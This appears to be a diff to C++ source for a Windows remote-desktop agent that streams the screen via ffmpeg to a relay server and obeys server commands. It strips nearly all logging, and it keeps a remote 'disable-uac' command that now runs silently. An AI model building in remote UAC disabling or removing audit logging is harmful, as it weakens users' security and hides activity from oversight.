@@ -122,9 +122,6 @@ bool RDPAgent::tls_handshake(TlsConn *c, const std::string &host, bool verify_ce
         SECPKG_CRED_OUTBOUND, NULL, &sc, NULL, NULL, &c->cred, NULL);
     if (ss != SEC_E_OK)
     {
-        std::ostringstream o;
-        o << std::hex << (DWORD)ss;
-        log("AcquireCredentialsHandle failed: 0x" + o.str());
         return false;
     }
     c->cred_ok = true;
@@ -154,9 +151,6 @@ bool RDPAgent::tls_handshake(TlsConn *c, const std::string &host, bool verify_ce
     }
     if (ss != SEC_I_CONTINUE_NEEDED)
     {
-        std::ostringstream o;
-        o << std::hex << (DWORD)ss;
-        log("ISC initial failed: 0x" + o.str());
         return false;
     }
 
@@ -168,7 +162,6 @@ bool RDPAgent::tls_handshake(TlsConn *c, const std::string &host, bool verify_ce
         int n = recv(c->sock, tmp, sizeof tmp, 0);
         if (n <= 0)
         {
-            log("tls_handshake: socket closed");
             return false;
         }
         in_buf.insert(in_buf.end(), tmp, tmp + n);
@@ -216,15 +209,11 @@ bool RDPAgent::tls_handshake(TlsConn *c, const std::string &host, bool verify_ce
             n = recv(c->sock, tmp, sizeof tmp, 0);
             if (n <= 0)
             {
-                log("tls_handshake: socket closed (incomplete)");
                 return false;
             }
             in_buf.insert(in_buf.end(), tmp, tmp + n);
             goto retry;
         }
-        std::ostringstream o;
-        o << std::hex << (DWORD)ss;
-        log("TLS handshake error: 0x" + o.str());
         return false;
     }
 
@@ -757,9 +746,6 @@ void RDPAgent::init_screen_metrics()
         g_screen_origin_x = ox;
         g_screen_origin_y = oy;
     }
-    log("screen " + std::to_string(g_screen_w.load()) + "x" + std::to_string(g_screen_h.load()) +
-        " origin=(" + std::to_string(g_screen_origin_x.load()) + "," +
-        std::to_string(g_screen_origin_y.load()) + ")");
 }
 
 // ============ MOUSE ============
@@ -1142,28 +1128,15 @@ void RDPAgent::handle_control(const std::string &j)
         std::string cmd;
         if (json_str(j, "cmd", cmd))
         {
-            logf("handle_control: received command: %s", cmd.c_str());
             if (cmd == "disable-uac")
             {
-                log("handle_control: Executing disable_uac() command from server");
-                if (disable_uac())
-                    log("handle_control: UAC disabled successfully");
-                else
-                    log("handle_control: WARNING - Failed to disable UAC");
+                disable_uac();
             }
             else if (cmd == "start-rdp-worker")
             {
-                // Worker уже запущен — игнорируем повторную команду
-                log("handle_control: start-rdp-worker ignored, already running");
             }
             else if (cmd == "stop-rdp-worker")
             {
-                // IMPORTANT: Worker should NOT handle stop-rdp-worker!
-                // This command is for the MAIN process (agent.exe service).
-                // Main process receives it via control WebSocket and calls stopRDPWorker()
-                // which terminates this worker process gracefully.
-                // Worker ignoring this ensures main has full control over shutdown sequence.
-                log("handle_control: stop-rdp-worker command IGNORED (main process handles it)");
             }
         }
     }
@@ -1201,13 +1174,8 @@ void RDPAgent::handle_control(const std::string &j)
 
         if (new_timeout >= 0 && shm && new_timeout != shm->timeout_min)
         {
-            logf("rdp_timeout changed: %d -> %d min", (int)shm->timeout_min, new_timeout);
             shm->timeout_min = new_timeout;
         }
-
-        log("config changed: codec=" + codec + " encoder=" + (encoder.empty() ? "cpu" : encoder) +
-            " bitrate=" + (bitrate.empty() ? "4M" : bitrate) +
-            " fps=" + std::to_string(fps) + " mjpeg_q=" + std::to_string(mq));
     }
 }
 
@@ -1275,14 +1243,12 @@ HANDLE RDPAgent::start_ffmpeg(const std::string &cmdline, PROCESS_INFORMATION &p
 
     if (!CreatePipe(&rd, &wr, &sa, 4 * 1024 * 1024))
     {
-        log("CreatePipe (stdout) failed");
         return NULL;
     }
     SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);
 
     if (!CreatePipe(&rd_err, &wr_err, &sa, 1024 * 1024))
     {
-        log("CreatePipe (stderr) failed");
         CloseHandle(rd);
         CloseHandle(wr);
         return NULL;
@@ -1300,12 +1266,9 @@ HANDLE RDPAgent::start_ffmpeg(const std::string &cmdline, PROCESS_INFORMATION &p
     std::vector<char> buf(cmdline.begin(), cmdline.end());
     buf.push_back(0);
 
-    log("launching ffmpeg: " + cmdline);
     if (!CreateProcessA(NULL, buf.data(), NULL, NULL, TRUE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
     {
-        DWORD err = GetLastError();
-        logf("CreateProcess failed, err=%lu", err);
         CloseHandle(rd);
         CloseHandle(wr);
         CloseHandle(rd_err);
@@ -1315,18 +1278,11 @@ HANDLE RDPAgent::start_ffmpeg(const std::string &cmdline, PROCESS_INFORMATION &p
     CloseHandle(wr);
     CloseHandle(wr_err);
 
-    logf("FFmpeg started: PID=%lu", pi.dwProcessId);
-
     std::thread([rd_err]()
                 {
         std::vector<char> b(4096);
         DWORD n = 0;
         while (ReadFile(rd_err, b.data(), (DWORD)b.size() - 1, &n, NULL) && n > 0) {
-            b[n] = 0;
-            std::string line(b.data(), n);
-            while (!line.empty() && (line.back() == '\n' || line.back() == '\r'))
-                line.pop_back();
-            if (!line.empty()) log("[ffmpeg stderr] " + line);
         }
         CloseHandle(rd_err); })
         .detach();
@@ -1376,7 +1332,6 @@ void RDPAgent::control_loop()
         std::string path = "/relay/ws/control/worker/" + config.agent_id;
         if (!ws_handshake(c, config.server_host, config.server_port, path))
         {
-            log("ctrl wss handshake failed");
             tls_close(c);
             delete c;
             std::this_thread::sleep_for(std::chrono::seconds(3));
@@ -1409,7 +1364,6 @@ void RDPAgent::control_loop()
         }
         tls_close(c);
         delete c;
-        log("ctrl wss disconnected, retry in 2s");
         std::this_thread::sleep_for(std::chrono::seconds(2));
     }
 }
@@ -1428,9 +1382,6 @@ void RDPAgent::resolution_watch_loop()
         if (w == g_screen_w.load() && h == g_screen_h.load() &&
             ox == g_screen_origin_x.load() && oy == g_screen_origin_y.load())
             continue;
-        log("resolution changed: " +
-            std::to_string(g_screen_w.load()) + "x" + std::to_string(g_screen_h.load()) +
-            " -> " + std::to_string(w) + "x" + std::to_string(h));
         g_screen_w = w;
         g_screen_h = h;
         g_screen_origin_x = ox;
@@ -1492,7 +1443,6 @@ void RDPAgent::run_session()
     TlsConn *c = tls_connect(config.server_host, config.server_port, config.verify_cert);
     if (!c)
     {
-        log("tls_connect failed");
         return;
     }
 
@@ -1525,10 +1475,8 @@ void RDPAgent::run_session()
     // Check if Secure Desktop is active (UAC prompt)
     if (is_secure_desktop_active())
     {
-        log("[WARNING] Secure Desktop (UAC) is active - skipping ffmpeg startup");
         tls_close(c);
         delete c;
-        logf("Waiting 3 seconds for Secure Desktop to close...");
         std::this_thread::sleep_for(std::chrono::seconds(3));
         return;
     }
@@ -1542,18 +1490,14 @@ void RDPAgent::run_session()
         // Check if Secure Desktop caused the failure
         if (is_secure_desktop_active())
         {
-            log("[INFO] Secure Desktop was active during ffmpeg startup failure");
-            runtime.consecutive_ffmpeg_errors = 0; // Reset error counter
-            logf("Waiting 3 seconds for Secure Desktop to close...");
+            runtime.consecutive_ffmpeg_errors = 0;
             std::this_thread::sleep_for(std::chrono::seconds(3));
             return;
         }
-        // Exponential backoff for startup failures
         runtime.consecutive_ffmpeg_errors++;
         int backoff_sec = 2 + (runtime.consecutive_ffmpeg_errors * 3);
         if (backoff_sec > 60)
             backoff_sec = 60;
-        logf("ffmpeg startup failed, backoff %d sec (error count: %d)", backoff_sec, runtime.consecutive_ffmpeg_errors);
         std::this_thread::sleep_for(std::chrono::seconds(backoff_sec));
         return;
     }
@@ -1570,41 +1514,28 @@ void RDPAgent::run_session()
     {
         if (runtime.restart)
         {
-            log("restart requested");
             break;
         }
         DWORD n = 0;
         if (!ReadFile(pipe, buf.data(), (DWORD)buf.size(), &n, NULL))
         {
-            DWORD err = GetLastError();
-            logf("ReadFile failed: err=%lu", err);
-
-            // Отслеживаем intermittent ошибки
-            if (had_data && err == 109) // 109 = ERROR_PIPE_NOT_CONNECTED (часто при error 5 в gdigrab)
+            if (had_data)
             {
-                // Check if Secure Desktop was active during the failure
                 if (is_secure_desktop_active())
                 {
-                    log("[INFO] Secure Desktop (UAC) caused the capture failure - will retry after UAC closes");
                     runtime.last_ffmpeg_error = "Pipe broken due to Secure Desktop (UAC prompt)";
-                    runtime.consecutive_ffmpeg_errors = 0; // Don't count this as a persistent error
+                    runtime.consecutive_ffmpeg_errors = 0;
                 }
                 else
                 {
                     runtime.consecutive_ffmpeg_errors++;
                     runtime.last_ffmpeg_error = "Pipe broken (likely gdigrab error 5 - screen capture failed)";
-                    logf("[WARNING] FFmpeg pipe broken - likely intermittent capture failure. Error count: %d", runtime.consecutive_ffmpeg_errors);
-                    if (runtime.consecutive_ffmpeg_errors > 3)
-                    {
-                        log("[ERROR] Too many consecutive FFmpeg failures. Check if screen is locked.");
-                    }
                 }
             }
             break;
         }
         if (n == 0)
         {
-            log("ffmpeg pipe closed");
             break;
         }
 
@@ -1613,17 +1544,14 @@ void RDPAgent::run_session()
         int chdr_len = std::snprintf(chdr, sizeof chdr, "%X\r\n", (unsigned)n);
         if (!tls_send_all(c, chdr, chdr_len))
         {
-            log("send header failed");
             break;
         }
         if (n > 0 && !tls_send_all(c, buf.data(), (int)n))
         {
-            log("send body failed");
             break;
         }
         if (!tls_send_all(c, "\r\n", 2))
         {
-            log("send trailer failed");
             break;
         }
 
@@ -1632,8 +1560,6 @@ void RDPAgent::run_session()
         auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now - t0).count();
         if (ms >= 5000)
         {
-            double kbps = (bytes * 8.0) / ms;
-            log("[" + codec + "/" + encoder + "] " + std::to_string((int)kbps) + " kbit/s");
             t0 = now;
             bytes = 0;
         }
@@ -1670,7 +1596,6 @@ RDPAgent::RDPAgent(const RDPConfig &cfg) : config(cfg)
     log("RDPAgent created: agent_id=" + config.agent_id +
         " timeout=" + std::to_string(config.timeout_min) + " min");
 
-    // Open shared memory for activity tracking (created by parent process)
     if (!config.shm_name.empty())
     {
         shm_handle = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, config.shm_name.c_str());
@@ -1679,20 +1604,14 @@ RDPAgent::RDPAgent(const RDPConfig &cfg) : config(cfg)
             shm = (ActivityShm *)MapViewOfFile(shm_handle, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ActivityShm));
             if (shm)
             {
-                log("Activity shared memory opened: " + config.shm_name);
                 shm->last_activity_time = GetTickCount64();
                 shm->timeout_min = config.timeout_min;
             }
             else
             {
-                log("MapViewOfFile failed for activity shm");
                 CloseHandle(shm_handle);
                 shm_handle = nullptr;
             }
-        }
-        else
-        {
-            log("OpenFileMapping failed for activity shm: " + config.shm_name);
         }
     }
 }
@@ -1721,7 +1640,6 @@ void RDPAgent::start()
     WSADATA w;
     if (WSAStartup(MAKEWORD(2, 2), &w) != 0)
     {
-        log("WSAStartup failed");
         return;
     }
 
@@ -1790,7 +1708,6 @@ bool RDPAgent::is_secure_desktop_active()
         // Secure Desktop name typically contains "Secure Desktop" or starts with a GUID
         if (name.find("Secure") != std::string::npos || name.find("Desktop") != std::string::npos)
         {
-            logf("Secure Desktop detected: '%s'", name.c_str());
             return true;
         }
     }
@@ -1815,7 +1732,6 @@ bool RDPAgent::is_consent_exe_running()
         {
             if (_stricmp(pe.szExeFile, "consent.exe") == 0)
             {
-                logf("UAC consent.exe process found (PID=%lu)", pe.th32ProcessID);
                 found = true;
                 break;
             }
@@ -1846,11 +1762,6 @@ int run_rdp_worker(const std::string &host, int port,
     if (GetFileAttributesA(ffmpeg.c_str()) == INVALID_FILE_ATTRIBUTES)
     {
         ffmpeg = "ffmpeg.exe";
-        log("[rdp_worker] ffmpeg.exe not in agent dir, will search PATH");
-    }
-    else
-    {
-        log("[rdp_worker] found ffmpeg.exe in agent dir: " + ffmpeg);
     }
 
     RDPConfig cfg;
@@ -1871,10 +1782,6 @@ int run_rdp_worker(const std::string &host, int port,
         cfg.framerate = fps;
     if (mjpeg_q > 0)
         cfg.mjpeg_q = mjpeg_q;
-
-    logf("run_rdp_worker: host=%s port=%d id=%s ffmpeg=%s timeout=%d min shm=%s codec=%s encoder=%s bitrate=%s fps=%d mjpeg_q=%d",
-         host.c_str(), port, agent_id.c_str(), ffmpeg.c_str(), timeout_min, shm_name.c_str(),
-         cfg.codec.c_str(), cfg.encoder.c_str(), cfg.bitrate.c_str(), cfg.framerate, cfg.mjpeg_q);
 
     RDPAgent agent(cfg);
     agent.start();
